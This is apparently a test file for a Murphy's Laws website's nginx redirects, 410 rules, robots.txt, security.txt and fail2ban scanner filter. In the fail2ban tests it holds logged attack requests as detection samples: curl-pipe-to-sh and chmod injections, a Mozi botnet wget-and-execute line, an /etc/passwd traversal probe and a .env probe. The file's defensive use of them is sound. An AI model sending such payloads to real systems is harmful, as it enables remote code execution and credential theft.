    expect(server.packages.map((pkg) => pkg.transport.type)).toEqual(['stdio']);
    for (const file of ['web/public/llms.txt', 'web/public/llms-full.txt']) {
      expect(readFileSync(resolve(root, file), 'utf8')).toContain(server.name);
    }
  });
});

describe('nginx legacy /murphy/ pages', () => {
  // Old file name -> current page. The file names are exact (nginx matches case-sensitively) and come from the
  // Search Console exports of 9 November 2026 and the previous site's menu in the Internet Archive.
  const pageRedirects: Array<[string, string]> = [
    ['murphy-true.html', '/origin-story'],
    ['life-by-murphys-law.html', '/examples'],
    ['about.html', '/about'],
    ['contact.html', '/contact'],
    ['murphy-laws', '/category/murphys-laws'],
    ['murphy-laws.html', '/category/murphys-laws'],
    ['murphy-love.html', '/category/murphys-love-laws'],
    ['murphy-technology.html', '/category/murphys-technology-laws'],
    ['murphy-computer.html', '/category/murphys-computer-laws'],
    ['murphy-commerce.html', '/category/murphys-commerce-laws'],
    ['murphy-real-estate.htm', '/category/murphys-real-estate-laws'],
    ['murphy-teaching.html', '/category/murphys-teaching-laws'],
    ['murphy-war.html', '/category/murphys-war-laws'],
    ['murphy-cops.html', '/category/murphys-cops-laws'],
    ['murphy-military-police.html', '/category/murphys-military-police-laws'],
    ['murphy-sewing.html', '/category/murphys-sewing-laws'],
    ['murphy-fire-brigade.html', '/category/murphys-volunteer-bushfire-brigade-laws'],
    ['murphy-Photography.html', '/category/murphys-photography-laws'],
    ['murphy-nurses.html', '/category/murphys-nurses-laws'],
    ['murphy-buses.html', '/category/murphys-bus-laws'],
    ['murphy-lotto.html', '/category/murphys-lotto-laws'],
    ['murphy-cas.htm', '/category/murphys-cowboy-action-shooting-cas-laws'],
    ['murphy-cas.html', '/category/murphys-cowboy-action-shooting-cas-laws'],
    ['murphy-cars.htm', '/category/murphys-cars-laws'],
    ['murphy-cars.html', '/category/murphys-cars-laws'],
    ['murphy-toddler.htm', '/category/murphys-toddlers-laws'],
    ['murphy-EMT.htm', '/category/murphys-emt-laws'],
    ['murphy-Graphic_Design.htm', '/category/murphys-graphic-design-laws'],
    ['murphy-Mothers.htm', '/category/murphys-mothers-laws'],
    ['murphy-scouts.html', '/category/murphys-scouting-laws'],
    ['murphy-political.html', '/category/murphys-political-laws'],
    ['murphy-golf.html', '/category/murphys-golf-laws'],
    ['murphy-employees.html', '/category/murphys-employees-laws'],
    ['murphy-office.html', '/category/murphys-office-laws'],
    ['murphy-music.html', '/category/murphys-music-laws'],
    ['murphy-horse.html', '/category/murphys-horse-laws'],
    ['murphy-martial-arts.html', '/category/murphys-martial-arts-laws'],
    ['murphy-miscellaneous.html', '/category/murphys-miscellaneous-laws'],
  ];

  // Pages that have no current equivalent, and bad backlinks: they must get the 410, not a redirect
  const goneUrls = [
    '/murphy/links.html',
    '/murphy/murphy-book-store.html',
    '/murphy/murphy-original.html',
    '/murphy/murphy-true.html:D',
    '/murphy/murphy-true.htmland',
    '/murphy/murphy-true.htmlkd',
    '/murphy/murphy-true.htmlVioxx',
    '/murphy/murphy-laws.html%20',
    '/murphy/murphy-laws.html ',
    '/murphy/murphy-',
    '/murphy/murphy',
    '/murphy/murp',
    '/murphy/img/Murphys-law-book.gif',
    '/murphy/MURPHY-GOLF.HTML',
  ];

  const exactBlocks = [...apex.matchAll(/^\s*location = \/murphy\/(\S+) \{\n\s*return 301 https:\/\/murphys-laws\.com(\S+);$/gm)];

  it.each(pageRedirects)('redirects /murphy/%s to %s', (file, target) => {
    const start = apex.indexOf(`location = /murphy/${file} {`);
    expect(start).toBeGreaterThan(-1);
    expect(apex.slice(start, apex.indexOf('}', start))).toContain(`return 301 https://murphys-laws.com${target};`);
  });

  it('has an exact redirect for every page in the table and no redirect missing from it', () => {
    const inConf = exactBlocks.map((match) => `${match[1]} ${match[2]}`).sort();
    expect(inConf).toEqual(pageRedirects.map(([file, target]) => `${file} ${target}`).sort());
  });

  it('lists each legacy file name once, and declares no location twice (nginx would refuse to start)', () => {
    const files = pageRedirects.map(([file]) => file);
    expect(new Set(files).size).toBe(files.length);
    const headers = [...apex.matchAll(/^ {4}location (= |\^~ )?(\S+) \{$/gm)].map((match) => `${match[1] ?? ''}${match[2]}`);
    expect(headers.length).toBeGreaterThan(40);
    expect(headers.filter((header, index) => headers.indexOf(header) !== index)).toEqual([]);
  });

  it('redirects only to category pages and content pages that exist', () => {
    // A category's slug is its file name in shared/data, except where nginx renames it (the data files kept
    // the slugs the API later corrected), so apply the renames before checking.
    const renames = new Map(
      [...apex.matchAll(/location = \/category\/(\S+) \{\n\s*return 301 https:\/\/murphys-laws\.com\/category\/(\S+?)\$is_args\$args;/g)].map(
        (match) => [match[1] as string, match[2] as string] as const,
      ),
    );
    expect(renames.size).toBeGreaterThan(5);
    const slugs = new Set(
      readdirSync(resolve(root, 'shared', 'data', 'murphys-laws'))
        .filter((name) => name.endsWith('.md'))
        .map((name) => name.slice(0, -'.md'.length))
        .map((slug) => renames.get(slug) ?? slug),
    );
    expect(slugs.size).toBeGreaterThan(40);
    const contentPages = new Set(
      readdirSync(resolve(root, 'shared', 'content'))
        .filter((name) => name.endsWith('.md'))
        .map((name) => `/${name.slice(0, -'.md'.length)}`),
    );
    expect(exactBlocks.length).toBe(pageRedirects.length);
    for (const match of exactBlocks) {
      const target = match[2] as string;
      // No $is_args$args: these rules are written for the path without its query string and drop it
      expect(target, `${match[1]} must not forward the query string`).not.toContain('$');
      const category = /^\/category\/([\w-]+)$/.exec(target)?.[1];
      if (category !== undefined) expect(slugs.has(category), `${match[1]} -> ${target}`).toBe(true);
      else expect(contentPages.has(target), `${match[1]} -> ${target}`).toBe(true);
    }
  });

  it('redirects the capital-M origin-story link to a page the site builds, ahead of any block or 410', () => {
    expect(readFileSync(resolve(root, 'web', 'scripts', 'ssg.ts'), 'utf-8')).toContain("canonicalPath: '/origin-story'");
    expect(isScannerPath('/Murphy/Murphy-true.html')).toBe(false);
    // selectLocation reads the apex server block only, so the rule cannot hide in a redirect-only block
    expect(selectLocation('/Murphy/Murphy-true.html')).toBe('= /Murphy/Murphy-true.html');
    expect(selectLocation('/Murphy/Murphy-true.html?utm_source=x')).toBe('= /Murphy/Murphy-true.html');
  });

  it('does not treat any legacy URL as a scanner, so none is dropped with 444 or counted by fail2ban', () => {
    const urls = [...pageRedirects.map(([file]) => `/murphy/${file}`), ...goneUrls, '/murphy', '/murphy/'];
    for (const url of urls) {
      expect(isScannerPath(url), url).toBe(false);
    }
  });

  // nginx's choice of location for a request path (the query string is not part of it, and %20 is a space):
  // an exact match wins; otherwise the longest prefix, and a ^~ prefix ends the search; otherwise the first
  // matching regex; otherwise the longest prefix. Only the apex server's top-level locations are considered.
  function selectLocation(requestPath: string): string {
    const path = decodeURIComponent(requestPath.split('?')[0] as string);
    const locations = [...apex.matchAll(/^ {4}location (= |\^~ |~\* |~ )?(\S+) \{$/gm)].map((match) => ({
      modifier: (match[1] ?? '').trim(),
      pattern: match[2] as string,
    }));
    const label = (location: { modifier: string; pattern: string }): string => `${location.modifier} ${location.pattern}`.trim();
    const exact = locations.find((location) => location.modifier === '=' && location.pattern === path);
    if (exact) return label(exact);
    const prefixes = locations
      .filter((location) => (location.modifier === '' || location.modifier === '^~') && path.startsWith(location.pattern))
      .sort((left, right) => right.pattern.length - left.pattern.length);
    const best = prefixes[0];
    if (best?.modifier === '^~') return label(best);
    const regex = locations.find(
      (location) =>
        (location.modifier === '~' || location.modifier === '~*') &&
        new RegExp(location.pattern, location.modifier === '~*' ? 'i' : '').test(path),
    );
    if (regex) return label(regex);
    return best ? label(best) : '';
  }

  it('selects the exact redirect for every legacy page, whatever else the server block holds', () => {
    for (const [file] of pageRedirects) {
      expect(selectLocation(`/murphy/${file}`), file).toBe(`= /murphy/${file}`);
      // The query string does not change the choice
      expect(selectLocation(`/murphy/${file}?utm_source=x`), file).toBe(`= /murphy/${file}`);
    }
    expect(selectLocation('/murphy')).toBe('= /murphy');
  });

  it.each(goneUrls)('selects the 410 location for %s, so no other rule can answer it', (url) => {
    expect(selectLocation(url)).toBe('^~ /murphy/');
  });

  it('routes /murphy/ and /murphy/murphy-laws.html/ through the trailing-slash rewrite, which strips the slash before location matching', () => {
    // A rewrite nested in a location would not run before location selection, so it must sit at server level
    expect(apex).toMatch(/^ {4}rewrite \^\/\(\.\+\)\/\$ \/\$1 permanent;$/m);
    expect(selectLocation('/murphy')).toBe('= /murphy');
    expect(selectLocation('/murphy/murphy-laws.html')).toBe('= /murphy/murphy-laws.html');
  });

  it('leaves real routes and the static files alone: the 410 prefix needs the slash after /murphy', () => {
    for (const path of ['/sitemap.xml', '/robots.txt', '/llms.txt', '/murphys-law-vs-sods-law', '/murphys-laws-about-work', '/category/murphys-laws', '/law/1']) {
      expect(selectLocation(path), path).not.toMatch(/murphy\/?$/);
    }
    // Google must be able to crawl a URL to see its 410, so robots.txt must not disallow the old section,
    // and nothing that builds the sitemap may list a /murphy/ URL
    expect(readFileSync(resolve(root, 'web', 'public', 'robots.txt'), 'utf-8')).not.toMatch(/^Disallow:.*\/murphy\b/m);
    expect(readFileSync(resolve(root, 'web', 'scripts', 'ssg.ts'), 'utf-8')).not.toContain('/murphy/');
  });
});

describe('legacy images', () => {
  it.each(['Murphys-law-book.gif', '10001844.gif', 'pvtmurphy.gif', 'pick_of_the_week.gif', 'art.com_logo.gif'])('%s is a real GIF, not another format renamed to .gif', (name) => {
    const file = resolve(root, 'web', 'public', 'img', name);
    expect(existsSync(file)).toBe(true);
    expect(['GIF87a', 'GIF89a']).toContain(readFileSync(file).subarray(0, 6).toString('ascii'));
  });
});

describe('nginx legacy URL redirects', () => {
  it.each([
    ['/about-us', '/about'],
    ['/contact-us', '/contact'],
    ['/privacy-policy', '/privacy'],
    ['/privacy-policy.html', '/privacy'],
    ['/terms-of-service', '/terms'],
    ['/terms-of-service.html', '/terms'],
    ['/old/index.htm', '/'],
    ['/index.htm', '/'],
    ['/old/murphy/murphy-toddler.htm', '/category/murphys-toddlers-laws'],
    ['/murphy', '/'],
    // The same old page linked with a capital M (locations are case-sensitive)
    ['/Murphy/Murphy-true.html', '/origin-story'],
    ['/apple-touch-icon-precomposed.png', '/apple-touch-icon.png'],
    ['/sitemaps.xml', '/sitemap.xml'],
    ['/sitemap_index.xml', '/sitemap.xml'],
    ['/sitemap-index.xml', '/sitemap.xml'],
    ['/sitemap.gz', '/sitemap.xml'],
    ['/favicon.png', '/favicon-32x32.png'],
    ['/apple-touch-icon-240x240.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-240x240-precomposed.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-120x120.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-120x120-precomposed.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-152x152.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-152x152-precomposed.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-167x167.png', '/apple-touch-icon.png'],
    ['/apple-touch-icon-167x167-precomposed.png', '/apple-touch-icon.png'],
    ['/favicon-512x512.png', '/android-chrome-512x512.png'],
    ['/security.txt', '/.well-known/security.txt'],
    // llms.txt lists these as markdown links, [Browse](https://murphys-laws.com/browse), and naive crawlers keep the ")"
    ['/browse)', '/browse'],
    ['/categories)', '/categories'],
    // FeedBurner polls the old feed path; the feed is served by the API (checked against openapi.ts below)
    ['/rss/murphys-laws.rss', '/api/v1/feed.rss'],
    // /law is the parent of /law/N: the law breadcrumb is Home > Browse > Category > Law
    ['/law', '/browse'],
    // API tools guess /swagger.json; the OpenAPI document is published as /openapi.json
    ['/swagger.json', '/openapi.json'],
  ])('redirects %s to %s', (from, to) => {
    const start = conf.indexOf(`location = ${from} {`);
    expect(start).toBeGreaterThan(-1);
    expect(conf.slice(start, conf.indexOf('}', start))).toContain(
      `return 301 https://murphys-laws.com${to};`,
    );
  });

  // [Browse](https://murphys-laws.com/browse) in llms.txt is correct markdown; the crawler that keeps the ")" is wrong,
  // so the fix is the redirect, and the page it lands on must be one the site really builds.
  it.each(['/browse', '/categories'])('redirects the markdown-captured %s) to a page the site builds', (route) => {
    expect(readFileSync(resolve(root, 'web', 'scripts', 'ssg.ts'), 'utf-8')).toContain(`canonicalPath: '${route}'`);
    expect(readFileSync(resolve(root, 'web', 'public', 'llms.txt'), 'utf-8')).toContain(`(https://murphys-laws.com${route})`);
    // The scanner map must not catch the request first: a block would drop it instead of redirecting it
    expect(isScannerPath(`${route})`)).toBe(false);
    expect(isScannerPath(`${route}%29`)).toBe(false);
  });

  it('redirects /law to the Browse page the site builds, and leaves /law/N to its own location', () => {
    expect(readFileSync(resolve(root, 'web', 'scripts', 'ssg.ts'), 'utf-8')).toContain("canonicalPath: '/browse'");
    // The exact match is for /law only: /law/123 still reaches the law location, and /law/ gets there through the trailing-slash rewrite
    expect(conf).toContain('location = /law {');
    expect(conf).toContain('location ~ ^/law/\\d+$ {');
    expect(isScannerPath('/law')).toBe(false);
  });

  it('sends an old /murphy/ link home in two hops: the trailing-slash rewrite, then the exact redirect', () => {
    expect(conf).toMatch(/^\s*rewrite \^\/\(\.\+\)\/\$ \/\$1 permanent;$/m);
    expect('/murphy/'.replace(/^\/(.+)\/$/, '/$1')).toBe('/murphy');
    expect(conf).toContain('location = /murphy {');
  });

  it('redirects the long policy slugs to the Privacy and Terms pages that the site serves and links in its footer', () => {
    const footer = readFileSync(resolve(root, 'web', 'src', 'components', 'templates', 'footer.html'), 'utf-8');
    const ssg = readFileSync(resolve(root, 'web', 'scripts', 'ssg.ts'), 'utf-8');
    for (const [route, view] of [['/privacy', 'privacy'], ['/terms', 'terms']]) {
      expect(footer).toContain(`href="${route}"`);
      expect(ssg).toContain(`slug: '${view}'`);
      expect(existsSync(resolve(root, 'web', 'src', 'views', `${view}.ts`))).toBe(true);
    }
  });

  it('redirects /swagger.json to the OpenAPI file that the build writes and llms.txt links', () => {
    expect(readFileSync(resolve(root, 'backend', 'scripts', 'export-openapi.ts'), 'utf-8')).toContain(
      "'web', 'public', 'openapi.json'",
    );
    expect(readFileSync(resolve(root, 'web', 'public', 'llms.txt'), 'utf-8')).toContain(
      '(https://murphys-laws.com/openapi.json)',
    );
    // The file is generated, not checked in: the deploy has to run the export before it syncs web/dist
    expect(readFileSync(resolve(root, '.github', 'workflows', 'deploy.yml'), 'utf-8')).toContain('npm run build:openapi');
  });

  it('redirects the old FeedBurner feed path to the RSS feed the API serves and the pages advertise', () => {
    expect(readFileSync(resolve(root, 'backend', 'src', 'openapi.ts'), 'utf-8')).toContain("'/api/v1/feed.rss'");
    expect(readFileSync(resolve(root, 'web', 'index.html'), 'utf-8')).toContain('https://murphys-laws.com/api/v1/feed.rss');
    // A redirect, not a block: the scanner map must let the request through
    expect(isScannerPath('/rss/murphys-laws.rss')).toBe(false);
  });

  it('redirects every image target to a file that exists in web/public', () => {
    const targets = [...conf.matchAll(/return 301 https:\/\/murphys-laws\.com\/([\w.-]+\.(?:png|ico|gif|jpe?g|svg|webp));/g)].map(
      (match) => match[1] as string,
    );
    expect(targets).toEqual(expect.arrayContaining(['apple-touch-icon.png', 'android-chrome-512x512.png', 'favicon-32x32.png']));
    for (const name of targets) {
      expect(existsSync(resolve(root, 'web', 'public', name)), name).toBe(true);
    }
  });

  it('redirects /security.txt to the served /.well-known/security.txt', () => {
    const start = conf.indexOf('location = /.well-known/security.txt {');
    expect(start).toBeGreaterThan(-1);
    expect(conf.slice(start, conf.indexOf('}', start))).toContain('return 200');
  });

  it('answers any other old /murphy/ URL with 410 and the site 404 page, without letting regex locations win', () => {
    // ^~ stops regex locations (such as the image caching rule inside location /) from taking the request
    const block = locationBlock('location ^~ /murphy/ {');
    expect(block).toContain('return 410;');
    expect(block).not.toContain('return 301');
    // 410 has no custom page by default; without this line nginx would send its bare built-in one
    const errorPages = apex.match(/^\s*error_page .*;$/gm) ?? [];
    expect(errorPages.filter((line) => /\b410\b/.test(line))).toEqual(['    error_page 404 410 /404.html;']);
    // The page is served by an internal location, so nobody can request /404.html as a normal page
    expect(locationBlock('location = /404.html {')).toContain('internal;');
  });

  it('keeps the bare /murphy section index redirecting home, because other sites may still link to it', () => {
    expect(locationBlock('location = /murphy {')).toContain('return 301 https://murphys-laws.com/;');
  });

  // The text of a location block, found by its header and closed by its matching brace
  function locationBlock(header: string): string {
    const start = apex.indexOf(header);
    expect(start, `${header} is missing from the apex server block`).toBeGreaterThan(-1);
    let depth = 0;
    for (let index = apex.indexOf('{', start); index < apex.length; index += 1) {
      if (apex[index] === '{') depth += 1;
      if (apex[index] === '}') depth -= 1;
      if (depth === 0) return apex.slice(start, index + 1);
    }
    throw new Error(`${header} is never closed`);
  }

  it('serves the JSON API with X-Robots-Tag noindex, so Google does not index the endpoints', () => {
    expect(locationBlock('location /api {')).toContain('add_header X-Robots-Tag "noindex" always;');
  });

  it('keeps Googlebot able to fetch /api/, which the pages call while rendering', () => {
    const robots = readFileSync(resolve(root, 'web', 'public', 'robots.txt'), 'utf-8');
    const groups = robots.split(/\r?\n\s*\r?\n/);
    const googlebot = groups.find((group) => /^User-agent: Googlebot\s*$/m.test(group));
    expect(googlebot, 'robots.txt has no Googlebot group').toBeDefined();
    // Googlebot follows only its own group, so the header above is what keeps the API out of the index
    expect(googlebot).not.toMatch(/^Disallow:\s*\/api/m);
    const everyone = groups.find((group) => /^User-agent: \*\s*$/m.test(group));
    expect(everyone).toContain('Disallow: /api/');
  });

  it('leaves the OG image location without the noindex header, so Google Images can index the images', () => {
    expect(locationBlock('location ~ ^/api/v1/og/law/')).not.toContain('X-Robots-Tag');
  });

  it('answers the Google prefetch proxy instead of returning 404', () => {
    const start = conf.indexOf('location = /.well-known/traffic-advice {');
    expect(start).toBeGreaterThan(-1);
    const block = conf.slice(start, conf.indexOf('\n    }', start));
    expect(block).toContain('default_type application/trafficadvice+json;');
    expect(block).toContain('return 200');
  });

  it('serves an RFC 9116 security.txt that points at the private reporting channel', () => {
    const start = conf.indexOf('location = /.well-known/security.txt {');
    expect(start).toBeGreaterThan(-1);
    const block = conf.slice(start, conf.indexOf('\n    }', start));
    expect(block).toContain('default_type text/plain;');
    expect(block).toContain('charset utf-8;');
    expect(block).toContain('Contact: https://github.com/ravidorr/murphys-laws/security/advisories/new\\n');
    expect(block).toMatch(/Expires: \d{4}-\d{2}-\d{2}T00:00:00\.000Z\\n/);
  });

  // CI is the renewal reminder: this fails 30 days before the Expires date in nginx.conf passes.
  it('serves a security.txt whose Expires date is more than 30 days away', () => {
    const start = conf.indexOf('location = /.well-known/security.txt {');
    const expires = /Expires: (\d{4}-\d{2}-\d{2}T00:00:00\.000Z)/.exec(conf.slice(start))?.[1];
    expect(expires).toBeDefined();
    const daysLeft = (Date.parse(expires as string) - Date.now()) / 86_400_000;
    expect(daysLeft).toBeGreaterThan(30);
  });

  it('serves the TDM reservation file with AI crawling not reserved', () => {
    const start = conf.indexOf('location = /.well-known/tdmrep.json {');
    expect(start).toBeGreaterThan(-1);
    const block = conf.slice(start, conf.indexOf('\n    }', start));
    expect(block).toContain('default_type application/json;');
    expect(block).toContain(`return 200 '[{"location":"/*","tdm-reservation":0}]';`);
  });
});

// This only pins the intended pattern with a hand-made stand-in for fail2ban's <HOST> and its
// timestamp removal. The real check is `fail2ban-regex` on the server (see the filter's header).
describe('fail2ban scanner filter', () => {
  const filter = readFileSync(resolve(root, 'config', 'fail2ban', 'filter.d-nginx-scanner.conf'), 'utf8');
  // failregex may span lines: fail2ban takes every indented line after the first as another pattern.
  const failregexes = (/^failregex = ([\s\S]*?)^ignoreregex/m.exec(filter)?.[1] ?? '')
    .split('\n')
    .map((line) => line.trim())
    .filter(Boolean)
    // fail2ban's config reader turns %% into % before it compiles the pattern; a lone % makes it refuse the file.
    .map((line) => line.replace('<HOST>', '(?<host>\\S+)').replace(/%%/g, '%'));
  const failregex = failregexes[0] ?? '';
  it('writes every literal percent sign as %% so fail2ban can load the filter', () => {
    const settings = filter.split('\n').filter((line) => !line.trimStart().startsWith('#'));
    expect(settings.join('\n').replace(/%%/g, '')).not.toContain('%');
  });

  // Which of the patterns match a line, as indexes: 0 is the 444 pattern, 1 the junk-400 pattern.
  const matching = (line: string): number[] =>
    failregexes.flatMap((pattern, index) => (new RegExp(pattern).test(line) ? [index] : []));
  const strikeHost = (line: string): string | undefined => {
    for (const pattern of failregexes) {
      const host = new RegExp(pattern).exec(line)?.groups?.host;
      if (host) return host;
    }
    return undefined;
  };

  it('does not depend on the bracketed timestamp that fail2ban strips before matching', () => {
    expect(failregexes).toHaveLength(2);
    for (const pattern of failregexes) {
      expect(pattern).not.toContain('\\[');
    }
  });

  it('starts every pattern with fail2ban\'s <HOST>, which this test only stands in for', () => {
    const lines = (/^failregex = ([\s\S]*?)^ignoreregex/m.exec(filter)?.[1] ?? '').split('\n').map((line) => line.trim()).filter(Boolean);
    expect(lines).toHaveLength(2);
    for (const line of lines) {
      expect(line.startsWith('^<HOST> ')).toBe(true);
      expect(line.split('<HOST>')).toHaveLength(2);
    }
  });

  it('counts 444 lines, with or without the timestamp, and ignores other statuses', () => {
    const regex = new RegExp(failregex);
    const request = '"GET /.env HTTP/1.1"';
    const agent = '0 "-" "Mozilla/5.0"';

    expect(regex.exec(`66.132.195.44 - - [30/Oct/2026:20:54:41 +0000] ${request} 444 ${agent}`)?.groups?.host).toBe('66.132.195.44');
    expect(regex.exec(`66.132.195.44 - - [] ${request} 444 ${agent}`)?.groups?.host).toBe('66.132.195.44');
    expect(
      regex.exec('159.89.227.118 - - [08/Nov/2026:09:01:02 +0000] "POST / HTTP/1.1" 444 0 "-" "Mozilla/5.0"')?.groups?.host,
    ).toBe('159.89.227.118');
    expect(regex.test(`66.132.195.44 - - [30/Oct/2026:20:53:32 +0000] ${request} 400 264 "-" "Mozilla/5.0"`)).toBe(false);
    expect(regex.test(`66.132.195.44 - - [] ${request} 4441 ${agent}`)).toBe(false);
    // A 444 is matched by the 444 pattern only, never by the junk-400 pattern.
    expect(matching(`66.132.195.44 - - [30/Oct/2026:20:54:41 +0000] ${request} 444 ${agent}`)).toEqual([0]);
  });

  // Request lines modelled on the production access.log of 2026-11-22 (the HTTP 400 section of the daily report); the
  // address and the byte values are shortened or invented.
  describe('400 lines for requests no real client sends', () => {
    const line = (request: string, status = 400, agent = '"-"', stamp = '[22/Nov/2026:00:24:50 +0000]') =>
      `65.49.1.122 - - ${stamp} "${request}" ${status} 166 "-" ${agent}`;

    it.each([
      ['the HTTP/2 preface', 'PRI * HTTP/2.0'],
      ['a TLS handshake', '\\x16\\x03\\x01\\x05\\xC9\\x01\\x00\\x05\\xC5\\x03\\x03-\\x11\\x15\\xF1'],
      ['a NUL-led binary probe', '\\x00\\x0E8\\x01\\x01\\x01\\x01'],
      ['an 0xFF-led binary probe', '\\xFF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7F\\x03\\x01NULL'],
      ['an open-proxy probe', 'CONNECT murphys-laws.com:443 HTTP/1.1'],
      ['an SSTP VPN probe', 'SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1'],
      ['the MGLNDD banner', 'MGLNDD_45.55.124.212_443'],
      ['binary bytes that start with a printable character', 'cq\\x8Fi;\\xD6\\x82p\\xBCU\\x22x\\xB7\\xF2'],
      ['a binary probe that starts with a semicolon', ';\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\xD4\\x07'],
      ['the WebLogic T3 handshake', 't3 12.1.2'],
      ['a bare method with no path', 'GET'],
      ['a method-less curl injection', '1;curl%20http://x/a|sh HTTP/1.0'],
      ['a method-less sh injection', 'x;sh%20/tmp/a HTTP/1.0'],
      ['a method-less chmod injection', 'x;chmod%20777%20/tmp/a HTTP/1.0'],
      ['a D-Link command injection with no method', '27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0'],
      ['another bare method', 'OPTIONS'],
      ['binary bytes beside a quote escape', '\\x22\\x16\\x03\\x01'],
    ])('counts %s', (_name, request) => {
      expect(strikeHost(line(request))).toBe('65.49.1.122');
      // Also once fail2ban has removed the timestamp.
      expect(strikeHost(line(request, 400, '"-"', '[]'))).toBe('65.49.1.122');
      // Only the junk-400 pattern counts it.
      expect(matching(line(request))).toEqual([1]);
    });

    it('does not backtrack over a long field of escaped bytes', () => {
      // A quadratic pattern needs seconds for this input; a linear one needs milliseconds. This runs in JavaScript's
      // RegExp, not fail2ban's Python re, so it guards the shape of the pattern, not fail2ban's timing.
      const escaped = '\\x16'.repeat(50_000);
      const lines = [
        `65.49.1.122 - - [22/Nov/2026:00:24:50 +0000] "GET / HTTP/1.1" 200 5 "-" "${escaped}"`,
        `65.49.1.122 - - [22/Nov/2026:00:24:50 +0000] "GET / HTTP/1.1" 400 5 "-" "${escaped}"`,
        `65.49.1.122 - - [22/Nov/2026:00:24:50 +0000] "GET / HTTP/1.1" 400 5 "${escaped}" "${escaped}"`,
        `65.49.1.122 - - [22/Nov/2026:00:24:50 +0000] "${escaped}" 200 5 "-" "-"`,
        `65.49.1.122 - - [22/Nov/2026:00:24:50 +0000] "${escaped}x" 4001 5 "-" "-"`,
      ];
      const started = performance.now();
      for (const entry of lines) {
        expect(strikeHost(entry)).toBeUndefined();
      }
      expect(performance.now() - started).toBeLessThan(1000);
    });

    it('reads the request line, not a later quoted field', () => {
      // A User-Agent that looks like a probe, on a normal 400, is not a strike.
      expect(strikeHost('65.49.1.122 - - [] "GET / HTTP/1.1" 400 166 "-" "CONNECT x\\x16"')).toBeUndefined();
    });

    it.each([
      ['a 400 for a normal GET from Censys', 'GET / HTTP/1.1', 400, '"Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"'],
      ['the ..%2F path-traversal probe', 'GET /..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1', 400, '"-"'],
      ['a 400 for a malformed encoding in a real URL', 'GET /search?q=%ZZ HTTP/1.1', 400, '"Mozilla/5.0"'],
      ['a 400 for a real POST', 'POST /api/laws HTTP/1.1', 400, '"Mozilla/5.0"'],
      ['a 408 for a bare method', 'GET', 408, '"-"'],
      ['a 200 for a normal request', 'GET /law/1 HTTP/1.1', 200, '"Mozilla/5.0"'],
      ['a 400 whose user agent only looks like a probe', 'GET /x HTTP/1.1', 400, '"CONNECT"'],
      ['a 4000 status', 'PRI * HTTP/2.0', 4000, '"-"'],
      ['an empty request line', '-', 400, '"-"'],
      ['a lower-case bare method', 'get', 400, '"-"'],
      ['a lower-case connect', 'connect x HTTP/1.1', 400, '"-"'],
      ['PRI with a path', 'PRI / HTTP/1.1', 400, '"-"'],
      ['a method-less word that only starts like wget', 'x;wget HTTP/1.0', 400, '"-"'],
      ['a method-less word that only starts like sh', 'x;shutdown%20now HTTP/1.0', 400, '"-"'],
      ['a method-less word that contains sh', 'x;ssh%20host HTTP/1.0', 400, '"-"'],
      ['the Mozi line answered with a 404', '27;wget%20http://x/Mozi.m HTTP/1.0', 404, '"-"'],
      ['a method and a path that mention wget', 'GET /x;wget%20y HTTP/1.1', 400, '"-"'],
      ['a URL path that contains CONNECT', 'GET /CONNECT HTTP/1.1', 400, '"-"'],
      ['a URL path that contains SSTP_', 'GET /SSTP_x HTTP/1.1', 400, '"-"'],
      ['a URL path that contains t3 and a digit', 'GET /t3 1 HTTP/1.1', 400, '"-"'],
      ['a quote in a hand-typed query', 'GET /?q=\\x22x\\x22 HTTP/1.1', 400, '"Mozilla/5.0"'],
      ['a backslash in a hand-typed query', 'GET /api/v1/laws?q=a\\x5Cb HTTP/1.1', 400, '"Mozilla/5.0"'],
    ])('ignores %s', (_name, request, status, agent) => {
      expect(strikeHost(line(request, status, agent))).toBeUndefined();
    });
  });
});

describe('fail2ban scanner jail', () => {
  const jail = readFileSync(resolve(root, 'config', 'fail2ban', 'jail.d-nginx-scanner.local'), 'utf8');
  // Only the [nginx-scanner] section counts: a setting in another section or in a comment does not
  // configure this jail.
  const section = /^\[nginx-scanner\]\s*$([\s\S]*?)(?=^\[|(?![\s\S]))/m.exec(jail)?.[1] ?? '';
  // fail2ban takes the last value of a repeated key, so each setting has to be defined exactly once.
  const setting = (key: string): string | undefined => {
    const values = [...section.matchAll(new RegExp(`^${key}[ \\t]*=[ \\t]*(.+)$`, 'gm'))].map((match) => match[1]?.trim());
    expect(values, `${key} must be set exactly once in [nginx-scanner]`).toHaveLength(1);
    return values[0];
  };

  it('has an [nginx-scanner] section', () => {
    expect(section).not.toBe('');
  });

  it('reads the log file instead of the journal', () => {
    // Debian and Ubuntu default every jail to backend = systemd, and a systemd jail ignores logpath, so
    // the jail has to name a file backend itself. Leaving it out, or choosing systemd, is the bug.
    expect(setting('backend'), 'without a backend line the jail inherits systemd').toBeDefined();
    expect(['auto', 'polling', 'pyinotify']).toContain(setting('backend'));
  });

  it('watches the scanner log and the access log that nginx writes', () => {
    // logpath may continue on indented lines, one file each; setting() only returns the first line.
    const logpaths = [
      setting('logpath') ?? '',
      ...[...(/^logpath[ \t]*=.*\r?\n((?:[ \t]+\S.*\r?\n?)*)/m.exec(section)?.[1] ?? '').matchAll(/^[ \t]+(\S.*)$/gm)]
        .map((match) => (match[1] ?? '').trim())
        .filter((path) => !path.startsWith('#')),
    ];
    expect(logpaths).toEqual(['/var/log/nginx/scanner.log', '/var/log/nginx/access.log']);
    for (const logpath of logpaths) {
      expect(conf).toMatch(new RegExp(`^\\s*access_log\\s+${logpath.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\s+combined\\b`, 'm'));
    }
  });

  it('uses the nginx-scanner filter on the web ports, and is enabled', () => {
    expect(setting('filter')).toBe('nginx-scanner');
